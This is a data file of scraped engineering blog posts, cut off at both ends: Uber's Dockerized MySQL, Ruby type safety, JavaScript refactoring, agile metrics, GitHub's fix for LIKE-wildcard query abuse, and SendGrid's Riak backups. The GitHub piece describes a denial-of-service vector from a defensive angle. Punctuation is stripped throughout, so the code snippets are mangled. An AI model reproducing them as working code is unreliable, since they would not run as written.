to get a snapshot from the master  which will fail the startup process  Then the master starts up in step 3  and the minions are able to connect and sync data in step 4 and 5   Experience with the Docker Runtime  Most of our hosts run Docker 1 9 1 with devicemapper on LVM for storage  Using LVM for devicemapper has turned out to perform significantly better than devicemapper on loopback  devicemapper has had many issues around performance and reliability  but alternatives such as AuFS and OverlayFS have also had a lot of issues   This means that there has been a lot of confusion in the community about the best storage option  By now  OverlayFS is gaining a lot of traction and seems to have stabilized  so we ll be switching to that and also upgrade to Docker 1 12 1   One of the pain points of upgrading Docker is that it requires a restart  which also restarts all containers  This means that the upgrade process has to be controlled so that we don t have masters running when we upgrade a host  Hopefully  Docker 1 12 will be the last version where we have to care about that  1 12 has the option to restart and upgrade the Docker daemon without restarting containers   Each version comes with many improvements and new features while introducing a fair number of bugs and regressions  1 12 1 seems better than previous versions  but we still face some limitations   docker inspect hangs sometimes after Docker has been running for a couple of days   Using bridge networking with userland proxy results in strange behavior around TCP connection termination  Client connections sometimes never receive an RST signal and stay open no matter what kind of timeout you configure   Container processes are occasionally reparented to pid 1  init   which means that Docker loses track of them   We regularly see cases where the Docker daemon takes a very long time to create new containers   Summary  We set out with a couple of requirements for storage cluster management at Uber   Multiple containers running on the same host Automation A single point of entry  Now  we can perform day to day maintenance through simple tools and a single UI  none of which require direct host access   Screenshot from our management console  From here  we can follow goal state progress  in this case where we are splitting a cluster into two by first adding a 2nd cluster and then cutting the replication link   We can better utilize our hosts by running multiple containers on each one  We can do fleet wide upgrades in a controlled fashion  Using Docker has gotten us here quickly  Docker has also allowed us to run a full cluster setup locally in a test environment and try out all the operational procedures   We started the migration to Docker in the beginning of 2016  and by now we are running around 1500 Docker production servers  for MySQL only  and we have provisioned around 2300 MySQL databases   There is much more to Schemadock  but the Docker component has been a great help to our success  allowing us to move fast and experiment while also hooking into existing Uber infrastructure  The entire trip store  which receives millions of trips every day  now runs on Dockerized MySQL databases together with other stores  Docker has  in other words  become a critical part of taking Uber trips   Joakim Recht is a staff software engineer in Uber Engineering s Aarhus office  and tech lead on Schemaless infrastructure automation   Photo Credits for Header   Humpback Whale Megaptera novaeangliae  by Sylke Rohrlach  licensed under CC BY 2 0  Image cropped for header dimensions and color corrected     To be precise  Percona Server 5 6    sync_binlog   0 and innodb_flush_log_at_trx_commit   2    A small selection of issues  https   github com docker docker issues 16653  https   github com docker docker issues 15629  https   developerblog redhat com 2014 09 30 overview storage scalability docker   https   github com docker docker issues 12738
66,engineering,Duck typing vs type safety in RubyDuck typing is one of the virtues of the Ruby language  it adds a lot of flexibility to the code  and allows us to use objects of different type in places where only specific methods are needed  Even though the idea behind duck typing may seem to be straight forward  it is easy to use it incorrectly  It s interesting to notice that over many years we ve adopted various techniques that seem to leverage duck typing  but the specifics of how exactly we re doing it are actually questionable  and I believe they deserve some reconsideration  This is directly related to the other important subject   type safety  and in this article I d like to explain why we should care about it  while keeping duck typing in mind  too   The problem with blank  method  Using blank  method  typically provided by ActiveSupport  is extremely common in Ruby Rails applications  People think it s a good example of duck typing   we rely on this single method  so we don t care if it s an array  string or nil   Here s a different way to think about it   the fact we have this method is a problem  as it can easily cause unexpected values to sneak into our system  and it also leads to additional complexity that is completely unnecessary   Consider this common pattern   def process   collection   unless collection   blank  collection   map     element       end end  We want to map a collection  but it could be what  An empty array  An empty string  Why is it even possible that this method can receive an empty string  This is the type of questions that are worth asking   The only reason why such conditionals are needed is that we don t handle data at the boundaries of our system explicitly  This means we re happily passing in something right into the core of our system  and then  protect  ourselves by adding a bunch of conditionals to various places  so that our system won t crash   This is how this method should look like instead   def process   collection   collection   map     element       end  The blank  method has a symbolic meaning here   it shows that instead of solving the root problem  by handling input data explicitly in a type safe manner  we ve chosen to complicate our code with monkey patches and extra conditionals   Without the extra blank  check  we still rely on duck typing  Notice that the collection can be anything that responds to map   Furthermore  its elements will also be handled via duck typing  You may start with a simple array  and later on change it to a custom enumerable object with map yielding compatible  duck typed elements  and you re all good   Type safety  Ruby with its duck typing may create an impression that type safety is not needed  or even that type safety is against duck typing  This is most certainly not true   One of the reasons of rapidly growing complexity and potential security problems is the lack of type safety at the boundaries  like HTTP params  Any external system which provides data to our applications should be treated with special care   Type safety in Ruby means that we want to make sure that the structure of the input data  as well as specific values in that structure  are valid in terms of basic constraints  Furthermore  type safety goes hand in hand with object coercions  You can easily reduce complexity of your application by making sure that specific values are properly coerced into types that are simple to work with   Let s go back to the trivial process method example  Imagine our system receives params as JSON  and one of the fields is called  collection  that we expect to be an array  How do you express this expectation   You can either write custom code or just use a dedicated tool  like dry validation   Schema   Dry    Validation   JSON do required    collection    value    array    end params     collection   w foo bar baz    result   Schema     params   process   result    collection    if result   success   This way you establish an explicit contract between the outer layer of your system which deals with http params  and your core application layer  which says  my system will process params only when collection key is present and its value is an array   but this is obviously a trivial case  let s make it more complex   What if our requirement is that it must be an array  with minimum 3 elements  and each element must be a string with minimum 2 characters  Imagine how your code would look like if you wanted to add guarding clauses for all these requirements  hint  it would be awful   Because handling such constraints manually leads to a lot of additional complexity  we tend to either do it only partially  ie by not checking everything  which results in less robust code  or just skip it altogether assuming that  it s gonna be fine   and it rarely is    With a dedicated gem like dry validation this type of constraints are easy to express   Schema   Dry    Validation   JSON   required    collection     array    min_size    3     each    str    min_size    2       Schema     collection        errors     collection    must be an array    Schema     collection     foo     bar      errors     collection    size cannot be less than 3    Schema     collection   w foo bar b     errors     collection   2    size cannot be less than 2     Schema     collection     foo     bar    1     errors     collection   2    must be a string     Schema     collection   w foo bar baz     errors       You may get an impression that this is now more complicated  but in reality it s the exact opposite  Most bugs are caused by unexpected or invalid values that are leaking into places of your system where it doesn t know how to handle them properly  so it crashes  You start fixing bugs by adding more and more conditionals  and in case of Rails and many Ruby apps  you use monkey patches like present  or blank    which sort of expresses what the contracts are  but it s vague  incomplete and implicit  and most importantly it does not guarantee that the core of your system receives valid input exclusively   Summary  Handling data in a type safe manner is a technique that makes your applications simpler and more robust  Even though it requires additional gems  as the problem domain is complex enough to justify extra libraries  you need data validation anyway  and you most likely already use a gem which provides that  ie ActiveModel   Regardless of the tools you decide to use  I encourage you to think about type safety when you re building a Ruby application  and validate data at the boundaries of your system  It s not against duck typing  you could even say it s a complementary concept  as through type safety you can perform all kinds of coercions to adjust input data in a way that will make your system simpler and leverage duck typing at the same time   There s much more to say about duck typing though  but I m leaving that for another article 
67,engineering,Writing Maintainable JavaScriptThis article was peer reviewed by Tom Greco  Dan Prince and Yaphi Berhanu  Thanks to all of SitePoint s peer reviewers for making SitePoint content the best it can be   Almost every developer has had the experience of maintaining or taking over a legacy project  Or  maybe it s an old project which got picked up again  Common first thoughts are to throw away the code base  and start from scratch  The code can be messy  undocumented and it can take days to fully understand everything  But  with proper planning  analysis  and a good workflow  it is possible to turn a spaghetti codebase into a clean  organised  and scalable one   I ve had to take over and clean up a lot of projects  There haven t been many I started from scratch  In fact  I am currently doing exact that  I ve learned a lot regarding JavaScript  keeping a codebase organised and   most importantly   not being mad at the previous developer  In this article I want to show you my steps and tell you my experience   Analyse the Project  The very first step is to get an overview of what is going on  If it s a website  click your way through all the functionality  open modals  send forms and so on  While doing that  have the Developer Tools open  to see if any errors are popping up or anything is getting logged  If it s a Node js project  open the command line interface and go through the API  In the best case the project has an entry point  e g  main js   index js   app js      where either all modules are initialized or  in the worst case  the entire business logic is located   Find out which tools are in use  jQuery  React  Express  Make a list of everything that is important to know  Let s say the project is written in Angular 2 and you haven t worked with that  go straight to the documentation and get a basic understanding  Search for best practices   Understand the Project on a Higher Level  Knowing the technologies is a good start  but to get a real feel and understanding  it s time to look into the unit tests  Unit testing is a way of testing functionality and the methods of your code to ensure your code behaves as intended  Reading   and running   unit tests gives you a much deeper understanding than reading only code  If they are no unit tests in your project  don t worry  we will come to that   Create a Baseline  This is all about establishing consistency  Now that you have all information about the projects toolchain  you know the structure and how the logic is connected  it s time to create a baseline  I recommend adding an  editorconfig file to keep coding style guides consistent between different editors  IDE s  and developers   Coherent indentation  The famous question  it s rather a war though   whether spaces or tabs should be used  doesn t matter  Is the codebase written in spaces  Continue with spaces  With tabs  Use them  Only when the codebase has mixed indentation is it necessary to decide which to use  Opinions are fine  but a good project makes sure all developer can work without hassle   Why is this even important  Everyone has it s own way of using an editor or IDE  For instance  I am a huge fan of code folding  Without that feature  I am literally lost in a file  When the indentation isn t coherent  this features fails  So every time I open a file  I would have to fix the indentation before I can even start working  This is a huge waste of time      While this is valid JavaScript  the block can t    be properly folded due to its mixed indentation  function foo  data    let property   String data   if  property      bar     property   doSomething property           more logic       Correct indentation makes the code block foldable     enabling a better experience and clean codebase  function foo  data    let property   String data   if  property      bar     property   doSomething property           more logic     Naming  Make sure that the naming convention used in the project is respected  CamelCase is commonly used in JavaScript code  but I ve seen mixed conventions a lot  For instance  jQuery projects often have mixed naming of jQuery object variables and other variables      Inconsistent naming makes it harder    to scan and understand the code  It can also    lead to false expectations  const  element       element    function _privateMethod      const self     this   const _internalElement       internal element    let  data   element data  foo          more logic       This is much easier and faster to understand  const  element       element    function _privateMethod      const  this     this   const  internalElement       internal element    let elementData    element data  foo          more logic     Linting Everything  While the previous steps were more cosmetic and mainly to help with scanning the code faster  here we introduce and ensure common best practices as well as code quality  ESLint  JSLint  and JSHint are the most popular JavaScript linters these days  Personally  I used to work with JSHint a lot  but ESLint has started to become my favorite  mainly because of its custom rules and early ES2015 support   When you start linting  if a lot of errors pop up  fix them  Don t continue with anything else before your linter is happy   Updating Dependencies  Updating dependencies should be done carefully  It s easy to introduce more errors when not paying attention to the changes your dependencies have gone through  Some projects might work with fixed versions  e g  v1 12 5    while others use wildcard versions  e g  v1 12 x    In case you need a quick update  a version number is constructed as follows  MAJOR MINOR PATCH   If you aren t familiar with how semantic versioning works  I recommend reading this article by Tim Oxley   There is no general rule for updating dependencies  Each project is different and should be handled as such  Updating the PATCH number of your dependencies shouldn t be a problem at all  and MINOR is usually fine too  Only when you bump the MAJOR number of your dependencies  you should look up what exactly has changed  Maybe the API has changed entirely and you need to rewrite large parts of your application  If that s not worth the effort  I would avoid updating to the next major version   If your project uses npm as dependency manager  and there aren t any competitors  you can check for any outdated dependencies with the handy npm outdated command from your CLI  Let me illustrate this with an example from one of my projects called FrontBook  where I frequently update all dependencies   As you can see I have a lot of major updates here  I wouldn t update all of them at once  but one at a time  Granted  this will take up a lot of time  yet it is the only way to ensure nothing breaks  if the project doesn t have any tests    Let s Get Our Hands Dirty  The main message I want you to take with you is that cleaning up doesn t necessarily mean removing and rewriting large sections of code  Of course  this is sometimes the only solution but it shouldn t be your first and only step  JavaScript can be an odd language  hence giving generic advice is usually not possible  You always have to evaluate your specific situation and figure out a working solution   Establish Unit Tests  Having unit tests ensures you understand how the code is intended to work and you don t accidentily break anything  JavaScript unit testing is worth its own articles  so I won t be able to go much into detail here  Widely used frameworks are Karma  Jasmine  Mocha or Ava  If you also want to test your user interface  Nightwatch js and DalekJS are recommended browser automation tools   The difference between unit testing and browser automation is  that the former tests your JavaScript code itself  It ensures all your modules and general logic work as intended  Browser automation  on the other hand  tests the surface   the user interface   of your project  making sure elements are in the right place and work as expected   Take care of unit tests before you start refactoring anything else  The stability of your project will improve  and you haven t even thought about scalability  A great side effect is not being worried all the time that you might have broken something and didn t notice   Rebecca Murphey as written an excellent article on writing unit tests for existing JavaScript   Architecture  JavaScript architecture is another huge topic  Refactoring and cleaning up the architecture boils down to how much experience you have with doing that  We have a lot of different design patterns in software development  but not all of them are a good fit where scalability is concerned  Unfortunately I won t be able to cover all of the cases in this article  but can at least give you some general advice   First of all  you should figure out which design patterns are already used in your project  Read up about the pattern  and ensure it s consistent  One of the keys to scalability is sticking to the pattern  and not mixing methodologies  Of course  you can have different design patterns for different purposes in your project  e g  using the Singleton Pattern for data structures or short namespaced helper functions  and the Observer Pattern for your modules  but should never write one module with one pattern  and another one with a different pattern   If there isn t really any architecture in your project  maybe everything is just in one huge app js    it s time to change that  Don t do it all at once  but piece by piece  Again  there is no generic way to do things and every project setup is different  Folder structures varies between projects  depending on the size and complexity  Usually   on a very basic level   the structure is split up into third party libraries  modules  data and an entry point  e g  index js   main js   where all your modules and logic gets initialized   This leads me to modularization   Modularize Everything   Modularization is by far not the answer to the great JavaScript scalability question  It adds another layer of API that developers have to get familiar with  This can be worth the hassle though  The principle is splitting up all your functionality in to tiny modules  By doing that  it is easier to solve problems in your code and to work in a team on the same codebase  Every module should have exactly one purpose and task to do  A module doesn t know about the outside logic of your application  and can be reused in different locations and situations   How do you split up a large feature with lots of tightly connected logic  Let s do this together      This example uses the Fetch API to request an API  Let s assume    that it returns a JSON file with some basic content  We then create a    new element  count all characters from some fictional content    and insert it somewhere in your UI  fetch  https   api somewebsite io post 61454e0126ebb8a2e85d     method   GET      then response      if  response status     200    return response json          then json      if  json    Object keys json  forEach key      const item   json key   const count   item content trim   replace   s  gi      length  const el      div class  foo   item className     p Total characters    count   p    div     const wrapper   document querySelector   info element    wrapper innerHTML   el            catch error    console error error     This is not very modular  Everything is tightly connected and dependent on the other pieces  Imagine this with larger  more complex functions and you would have to debug this because something breaks  Maybe the API doesn t respond  something changed inside of the JSON or whatever  A nightmare  isn t it   Let s separate out the different responsibilities      In the previous example we had a function that counted    the characters of a string  Let s turn that into a module  function countCharacters  text    const removeWhitespace     s  gi  return text trim   replace removeWhitespace      length       The part where we had a string with some markup in it     is also a proper module now  We use the DOM API to create    the HTML  instead of inserting it with a string  function createWrapperElement  cssClass  content    const className   cssClass     default   const wrapperElement   document createElement  div    const textElement   document createElement  p    const textNode   document createTextNode  Total characters    content     wrapperElement classList add className   textElement appendChild textNode   wrapperElement appendChild textElement   return wrapperElement       The anonymous function from the  forEach   method     should also be its own module  function appendCharacterCount  config    const wordCount   countCharacters config content   const wrapperElement   createWrapperElement config className  wordCount   const infoElement   document querySelector   info element    infoElement appendChild wrapperElement      Alright  we have three new modules now  Let s see the refactored fetch call   fetch  https   api somewebsite io post 61454e0126ebb8a2e85d     method   GET      then response      if  response status     200    return response json          then json      if  json    Object keys json  forEach key    appendCharacterCount json key          catch error    console error error     We could also take the logic from inside the  then   methods and separate that  but I think I have demonstrated what modularization means   If  modularization What Else   As I already mentioned  turning your codebase in tiny modules adds another layer of API  If you don t want that  but want to keep it easier for other developers to work with your code  it s absolutely fine to keep functions larger  You can still break down your code into simpler portions and focus more on testable code   Document Your Code  Documentation is a heavily discussed topic  One part of the programming community advocates for documenting everything  while another group thinks self documenting code is the way to go  As with most things in life  I think a good balance of both makes code readable and scalable  Use JSDoc for your documentation   JSDoc is an API documentation generator for JavaScript  It is usually available as a plugin for all well known editors and IDE s  Let s go through an example   function properties  name  obj         if   name  return  const arr       Object keys obj  forEach key      if  arr indexOf obj key  name       1    arr push obj key  name          return arr     This function takes two parameters and iterates over an object  which then returns an array  This might not be an overly complicated method  but for someone who hasn t written the code it might take a while to figure out what is going on  Additionally  it s not obvious what the method does  Let s start documenting         Iterates over an object  pushes all properties matching  name  into   a new array  but only once per occurance     param  String  propertyName   Name of the property you want    param  Object  obj   The object you want to iterate over    return  Array     function getArrayOfProperties  propertyName  obj         if   propertyName  return  const properties       Object keys obj  forEach child      if  properties indexOf obj child  propertyName       1    properties push obj child  propertyName          return properties     I haven t touched much of the code itself  Just by renaming the function and adding a short  yet detailed comment block  we ve improved the readability   Have An Organized Commit Workflow  Refactoring is a huge mission on its own  To be able to always rollback your changes  in case you break something and only notice later   I recommend committing every update you make  Rewrote a method  git commit  or svn commit   if you work with SVN   Renamed a namespace  folder or a few images  git commit   You get the idea  It might be tedious for some people to do  but it really helps you clean up properly and get organized   Create a new branch for the entire refactoring effort  Don t ever work on master  You may have to do quick changes or upload bug fixes to the production environment and you don t want to deploy your  maybe untested  code until it is tested and finished  Hence it is advised to always work on a different branch   In case you need short update how all this works  there is an interesting guide from GitHub on their version control workflow   How To Not Lose Your Mind  Besides all the technical steps required for a clean up  there is one important step I rarely see mentioned anywhere  not being mad at the previous developer  Of course  this doesn t apply to everyone  but I know that some people experience this  It took me years to really understand this and get over it  I used to get pretty mad at the previous developers code  their solutions and just why everything was such a mess   In the end  all that negativity never got me anywhere  It only results in you refactoring more than necessary  wasting your time  and maybe breaking things  This just makes you more and more annoyed  You might spend extra hours and nobody will ever thank you for rewriting an already working module  It s not worth it  Do what is required  analyse the situation  You can always refactor tiny bits every time you go back to a module   There are always reasons why code is written the way it is  Maybe the previous developer just didn t have enough time to do it properly  didn t know better  or whatever  We have all been there   Wrapping It Up  Let s go over all steps again  to create a checklist for your next project   Analyse the project  Put your developer hat away for a moment  and be a user to see what it s all about   Go through the codebase and make a list of the tools in use   Read up documentation and best practices of the tools   Go through the unit tests to get a feeling for the project on a higher level   Create a baseline  Introduce  editorconfig to keep the coding style guides consistent between different IDEs   to keep the coding style guides consistent between different IDEs  Make indentation consistent  tabs or spaces  doesn t matter   Enforce a naming convention   If not already present  add a linter like ESLint  JSLint  or JSHint   Update dependencies  but do it wisely and watch out for what exactly has been updated   Cleaning up  Establish unit tests and browser automation with tools like Karma  Jasmine  or Nightwatch js   Make sure the architecture and design pattern are consistent   Don t mix design patterns  stick to the ones already there   Decide if you want to split up your codebase into modules  Each should only have one purpose and be unaware of the rest of your codebase logic   If you don t want to do that  focus more on testable code and break it down into simpler blocks   Document your functions and code in a balanced way with properly named functions   Use JSDoc to generate documentation for your JavaScript   Commit regularly and after important changes  If something breaks  it s easier to go back   Don t lose your mind  Don t get mad at the previous developer  negativity will only result in unnecessary refactoring and wasting time   There have been reasons why code is written like it is  Keep in mind that we ve all been there   I really hope this article has helped you  Let me know if you struggle with any of the steps  or maybe have some good advice that I didn t mention 
68,engineering,Redirecting 
69,engineering,How One Jira Ticket Made My Employer  1MMThe essence of agile is the continual process of improving efficiency   This is the only thing you really need to know about agile in order to put it to  productive  work in your organization  You should value   Individuals and interactions over processes and tools  Working software over comprehensive documentation  Customer collaboration over contract negotiation  Responding to change over following a plan  If that doesn t look familiar  you really need to read this   I ll add some more of my favorite dev team values   Skills over titles  Continuous delivery over deadlines  Support over blame  Collaboration over competition  Why is your team s agile process so dysfunctional  Chances are you re losing track of those values  and you re trying to cram the same old chaotic waterfall into agile trappings like scrum meetings and retrospectives   Face to face scrum meetings can be counter productive because they encourage competition over collaboration  employees compare themselves to each other   blame over support  deadlines over continuous delivery   we have to close x tickets before Friday or we ll have to work the weekend     and a pecking order that infects a team like cancer   Where in the agile manifesto does it say   stand up for 15 minutes every day and feel slow shamed because the coder across from you finished 6 tickets yesterday and you only finished one    There s always the obnoxious over achiever who comes in early and goes home late every day  and closes 2x as many tickets as the rest of the team  Note  almost always a relatively inexperienced  but super eager and super impressive  Too bad they re slowing down the rest of the team   Likewise  there s always the slow poke who closes one or two tickets  Odd  They re a great mentor  and they re always chiming in on other people s tickets  helping them get unstuck  teaching  and giving great advice  They should be able to close 10x as many tickets as the rest of us  right  They must simply be terrible at time management   Hint  They re not  You just suck at evaluating employees    Ticket counting and  velocity tracking  are the worst ideas in software development management since waterfall chaos   Forget Counting Tickets  Forget points  Forget estimates and commitments  Estimates are all worthless lies  Try weekly demos  instead  Get the marketing team to hype the features you finished last month  not the features you think you might be able to finish next month   Build yourself a good feature toggle and marketing release management system and you can still release features according to a marketing hype schedule  but you ll be hyping finished features  and your team will never have to burn out on night   weekend crunch times again   Tip  Your marketing and sales teams should never be allowed to discuss features  in the pipeline   and your sales   biz dev teams should never be able to commit to a deadline without a really flexible MVP  minimum viable product  plan  When I say flexible  I mean flexible   e g   Elon Musk is taking us to Mars  Initial sales MVP  get a balloon into the clouds   Engineering estimates are usually wrong by orders of magnitude  but nobody wants to face up to that fact and deal in reality   What Should We Measure   The only thing that matters in software development is that the users love your software   Everything else in this list serves that purpose  Remember that  Now bring on the real metrics   The first 5 of these metrics are all essential business key performance indicators  KPIs  for nearly every app developer   You re going to wonder why I m sharing these with a bunch of developers and telling you that these are the metrics you need to focus on  but bear with me  The remaining metrics will clear that up for you   1  Revenue  None of the other metrics mean a damn thing if you go broke  If you run out of fuel  it s game over  You re done  Pack up your office and go home   Core Tactics   Conversion rate optimization  Crawlable content  Sharable content  Page load   perf  Optimize to keep the lights on   2  Monthly Active Users  MAU   Do you have any users  Do you have more than last month  If you re a venture funded startup  you d better pray you re growing fast enough  In the beginning you can double month over month if you work hard  Of course  all hockey stick curves are really S curves in disguise  but chances are good you have plenty of room left to grow   Core Tactics   Page load   perf  Sharable content  TDD   code review  Optimize for growth   3  Net Promoter Score  NPS   Remember when I said if you run out of fuel  it s game over  I tricked you  didn t I  You thought I was talking about money   Money isn t your fuel  Fans are your fuel   Fans are the key to unlocking more money  More sharing  More growth  More joy  More magic   Core Tactics   TDD   code review  Page load   perf  Collaboration with support   QA staff  Optimize to turn users into evangelists   4  Viral Factor  Also known as k factor or viral quotient  If you re not measuring this  start right now   k   i   c  i   number of invites  e g   shares  per user  c   conversion rate per share  k   1 is steady  No growth  No decline   k   1 means exponential growth   k   1 means exponential decline   You should have a giant screen in the middle of the office with a k factor gauge in bright red for  1  green for  1  overlaid on your 3 month MAU growth chart   Core Tactics   Sharable content  Integrate sharing into core product  Conversion rate optimization  Page load   perf  Optimize for sharing and new visitor conversion   5  Support tickets  Nothing says  this garbage is broken  like an email to customer support  When was the last time somebody contacted support just to tell you how cool you are   Support tickets are your canary in the coal mine  When somebody says something is broken  don t think   it works for me    Even if it s user error  it s not user error  Chances are there s a flaw in the design and 1 000 other people are bothered by it too  1 000 other people for every one person who cares enough to write you and complain  1 000 people who d rather hit the back button than waste their time on your app for one more second   Ideally  you should aim for zero support tickets  You ll never reach that metric  if you re lucky   but you should consider every support ticket to be a bug report  Start categorizing the common ones  Count them and use them to prioritize fixes   I m not saying the customer is always right  Sometimes customers don t know what they want until you give it to them  I am saying that if it s in your inbox  you re doing something wrong   Core Tactics   TDD   code review  CI CD  Feature toggle   rollout  Periodic bug burndown hackathons  Collaboration with support   QA staff  Optimize for problem free customer experience   Key Engineering Focus Metrics  As promised  The keys to unlocking the mysteries of the business KPIs  As it turns out  you can move all of the above needles a lot with two levers   6  Bug Count  Here s a shock  Some ticket counts are good for something  Be careful to categorize all the bug tickets as bugs  and then you can see a bug count   All software has bugs  but not all bugs need fixing  If a bug appears only on an ancient phone  and that phone is only used by one user of your software  and that user isn t even a paying customer  do you need to fix that bug  Probably not  Close it and move on  Prioritize the bugs that are hurting your users the most   Get busy and squash them   Core Tactics   TDD   code review  Periodic bug burndown hackathons  Collaboration with support   QA staff  Optimize for a bug free experience   7  Performance  I m cheating a little this time  This one is going to contain 3 more critical metrics   Load time  The time it takes for your app to be usable after the user clicks the icon or hits your URL  Aim for  1 second  Beyond that  you lose users  Every ms you can trim off load time comes with measurable benefits to every metric above  Response time  The time from user action  like a click  to a visible response in the application  Aim for  100ms  Any more than that feels like lag  Animation time  The maximum time it takes to draw one animation frame  Aim for 10ms  Any more than 16 ms will cause noticeable jank  and may even make the user feel a bit queasy  You ll need a little breathing room for this one  Keep it under 10ms   Load time is by far the most important mini metric in this list  It will move the business KPI needles like nothing else I ve mentioned  But response time and smooth animations cause a magical side effect  Users are happier after using your app  You see  every little janky glitch  every little delayed response feels jarring to users on an almost subconscious level   Give the same user the same app with performance issues fixed  and they report much higher satisfaction ratings  even if they can t put their finger on why   Our little secret   Core Tactics   Periodic performance hackathons  In depth performance audits  10ms  100ms  1000ms  repeat  Optimize for a jank free experience   There s A Lot More To It  Of course  this little rant can t go into great depth on how developers can directly manipulate viral factor and MAU numbers  but I ll leave you with a hint  You can  And when those numbers are staring you in the face every day  and you know that it s your job to move them   not management s job  not marketing s job   your job  I m sure you ll come up with some creative ideas to make it happen   If your manager thinks you have better things to do  send them this link   Now go out there and move the needle on some metrics that actually matter 
70,engineering,GitHub EngineeringLooking through our exception tracker the other day  I ran across a notice from our slow query logger that caught my eye  I saw a SELECT   WHERE   LIKE query with lots of percent signs in the LIKE clause  It was pretty obvious that this term was user provided and my first thought was SQL injection     3   92 sec   SELECT     WHERE   profiles   email LIKE   64 68 6f 6d 65 73  67 6d 61 69 6c  63 6f 6d     LIMIT 10  Looking at the code  it turned out that we were using a user provided term directly in the LIKE clause without any checks for metacharacters that are interpreted in this context       _         def self   search   term   options       limit     options    limit      30    to_i friends   options    friends         with_orgs   options    with_orgs    nil    false   options    with_orgs   if term   to_s   index         users   User   includes    profile     where    profiles email LIKE           term          limit   limit    to_a else users   user_query   term   friends  friends   limit  limit   end       end  While this isn t full blown SQL injection  it got me thinking about the impact of this kind of injection  This kind of pathological query clearly has some performance impact because we logged a slow query  The question is how much   I asked our database experts and was told that it depends on where the wildcard is in the query  With a   in the middle of a query  the database can still check the index for the beginning characters of the term  With a   at the start of the query  indices may not get used at all  This bit of insight led me to run several queries with varied   placement against a test database   mysql   SELECT 1 FROM  profiles  WHERE  email  LIKE  chris github com    1 row in set   0   00 sec   mysql   SELECT 1 FROM  profiles  WHERE  email  LIKE   ris github com    1 row in set   0   91 sec   mysql   SELECT 1 FROM  profiles  WHERE  email  LIKE  chris github     1 row in set   0   00 sec   mysql   SELECT 1 FROM  profiles  WHERE  email  LIKE   c h r i s   g i t h u b   c o m     21 rows in set   0   93 sec    It seems that unsanitized user provided LIKE clauses do have a potential performance impact  but how do we address this in a Ruby on Rails application  Searching the web  I couldn t find any great suggestions  There are no Rails helpers for escaping LIKE metacharacters  so we wrote some   module LikeQuery   Characters that have special meaning inside the  LIKE  clause of a query          is a wildcard representing multiple characters     _  is a wildcard representing one character        is used to escape other metacharacters  LIKE_METACHARACTER_REGEX         _      What to replace  LIKE  metacharacters with  We want to prepend a literal   backslash to each metacharacter  Because String gsub does its own round of   interpolation on its second argument  we have to double escape backslashes   in this String  LIKE_METACHARACTER_ESCAPE         1    Public  Escape characters that have special meaning within the  LIKE  clause   of a SQL query      value   The String value to be escaped      Returns a String  def like_sanitize   value   raise ArgumentError unless value   respond_to     gsub   value   gsub   LIKE_METACHARACTER_REGEX   LIKE_METACHARACTER_ESCAPE   end extend self module ActiveRecordHelper   Query for values with the specified prefix      column   The column to query    prefix   The value prefix to query for      Returns an ActiveRecord  Relation def with_prefix   column   prefix   where        column   LIKE           LikeQuery   like_sanitize   prefix          end   Query for values with the specified suffix      column   The column to query    suffix   The value suffix to query for      Returns an ActiveRecord  Relation def with_suffix   column   suffix   where        column   LIKE            LikeQuery   like_sanitize   suffix         end   Query for values with the specified substring      column   The column to query    substring   The value substring to query for      Returns an ActiveRecord  Relation def with_substring   column   substring   where        column   LIKE            LikeQuery   like_sanitize   substring          end end end  ActiveRecord    Base   extend LikeQuery ActiveRecord    Base   extend LikeQuery    ActiveRecordHelper  We then went through and audited all of our LIKE queries  fixing eleven such cases  The risk of these queries turned out to be relatively low  A user could subvert the intention of the query  though not in any meaningful way  For us  this was simply a Denial of Service  DoS  vector  It s nothing revolutionary and it is not a new vulnerability class  but it s something to keep an eye out for  Three second queries can be a significant performance hit and application level DoS vulnerabilities need to be mitigated 
71,engineering,Strachey Lecture   Probabilistic machine learning  foundations and frontiersProbabilistic modelling provides a mathematical framework for understanding what learning is  and has therefore emerged as one of the principal approaches for designing computer algorithms that learn from data acquired through experience  Professor Ghahramani will review the foundations of this field  from basics to Bayesian nonparametric models and scalable inference  He will then highlight some current areas of research at the frontiers of machine learning  leading up to topics such as probabilistic programming  Bayesian optimisation  the rational allocation of computational resources  and the Automatic Statistician   The Strachey lectures are generously supported by OxFORD Asset Management 
72,engineering,This is strictly a violation of the TCP specification   Idea of the daytotally not insane  This is strictly a violation of the TCP specification  I ve published an article on the CloudFlare blog 
73,engineering,How to Back Up Riak and Solr DataNote  This is the second of three engineering blog posts from Brad Culberson one of our highest ranking engineers here at SendGrid  If you re interested in reading more posts like this  check out his first post here or view our technical blog roll   SendGrid is using Riak and Solr for the Marketing Campaigns contacts dataset  We built a disaster recovery plan that protects that dataset from corruption unintentional deletion data center loss  This is a challenging task due to the size and growth of that data  We re currently storing approximately 2TB of key value data and 18TB of Solr index data   We evaluated several solutions that could have solved the problem   Riak ring replication File system backups Data extraction Kafka log backups  Riak ring replication  In order to vet this solution  we built a disaster recovery ring and began a full sync  After tuning  we were able to get a full sync to complete within 48 72 hours  This solution is quite simple as we already pay Basho for replication licensing and have the replication tools on the servers  A negative effect of this solution is that any time we may have a data center loss or ring loss we could have lost up to 72 hours of data depending on where in the process the full sync was  Basho also has a real time sync  That does couple the two rings together on every write something we did not want  The other negative result of this solution is that depending on what causes the  disaster   many scenarios could also corrupt the replication cluster   To find out more about Riak replication  read their docs   File system backups  Backing up the file system is a common approach  This would have worked  but our biggest concern was the disk IO necessary to read and back up 20TB of data and then the compute and resources needed to compress  encrypt  and transfer that data outside the data center  The product goal was to have at least a full weekly and daily incrementals  This solution would have made the fulls possible but we would have needed to do them daily to keep the loss limited  Due to the cost and waste from redundancy included in the backups  we ruled out this option before any implementation   Data extraction  This solution would build an endpoint in our application server that would allow extraction and restore user data  We could then run a job s  in Chronos which iterates all users and performs that data extraction  compresses  encrypts  and shuttles the data to another data center   This was very attractive for a few reasons   We aren t backing up 3x the dataset size based on the n val of the Riak ring  and are not backing up the huge Solr indexes  We can prioritize restores backup recovery per user  No  unknown  technology   This ended up being the best choice for us for the full backups we wanted weekly  We added the endpoint and the Mesos job and scheduled user_id   7 daily so that each day 1 7 of our users are backed up   After analyzing the total recovery time of our ring  we have started to build and share the data to smaller Riak rings using the same technology such that the total recovery of the dataset meets product requirements and only affects a   of our users   This did not solve the incremental backup we desired  but we had an ace up our sleeves for that  Kafka    Kafka log backups  All writes that go through our contacts database go through Kafka  We do that so that we can protect the Riak and Solr cluster from being overloaded and still respond synchronously to requests when we have spikes in updates of the contact data   Since we were using Kafka for all updates  we had the capability to add a consumer to the Kafka topics to transform and 